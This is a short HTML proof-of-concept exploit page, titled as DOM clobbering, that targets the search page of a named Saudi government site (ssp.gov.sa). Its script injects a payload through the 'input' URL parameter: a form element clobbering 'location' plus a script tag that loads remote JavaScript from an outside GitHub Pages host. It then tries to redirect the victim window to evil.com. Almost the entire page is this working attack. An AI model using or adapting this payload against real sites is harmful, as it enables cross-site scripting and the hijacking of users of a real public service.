<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC – DOM Clobbering</title>
</head>
<body>
  <h3>🚨 DOM Clobbering PoC – ssp.gov.sa</h3>
  <p>سيتم فتح نافذة جديدة لمحاولة تنفيذ الكود داخل نطاق الضحية.</p>

  <script>
    const payload = encodeURIComponent('<form id=location></form><script src="https://h1ckbug.github.io/xss-poc/test.js"></script>');
    const win = window.open("https://ssp.gov.sa/ar/GeneralServices/Search/Pages/default.aspx?input=" + payload);

    // بعد فتح الصفحة بمدة، نحاول إجبار المتصفح على التحويل
    setTimeout(() => {
      try {
        win.location = "https://evil.com"; // DOM Clobbering redirect if exploitable
      } catch (e) {
        console.warn("Redirection blocked by browser security.");
      }
    }, 3000);
  </script>
</body>
</html>
